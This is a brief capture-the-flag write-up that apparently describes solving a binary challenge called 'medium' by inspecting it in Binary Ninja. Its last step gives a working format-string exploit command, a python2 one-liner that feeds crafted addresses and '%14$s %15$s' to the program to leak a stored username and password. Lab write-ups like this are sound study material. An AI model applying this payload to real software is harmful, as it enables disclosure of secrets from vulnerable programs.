# [medium](medium)

* Open the program in Binary Ninja.
In Binary Ninja, locate the memory addresses where the username and password are stored.
![](https://github.com/ace-lii/ctf_writeups/blob/main/img/medium1.png?raw=true)


* You'll find that the 14th and 15th positions in the stack are useable.

![](https://github.com/ace-lii/ctf_writeups/blob/main/img/medium2.png?raw=true)
 
![](https://github.com/ace-lii/ctf_writeups/blob/main/img/medium3.png?raw=true)

* Exploit the vulnerability using a command like this: python2 -c 'print "\x60\xa0\x04\x08\xa0\xa0\x04\x08 %14$s %15$s"' |./medium.

![](https://github.com/ace-lii/ctf_writeups/blob/main/img/medium4.png?raw=true)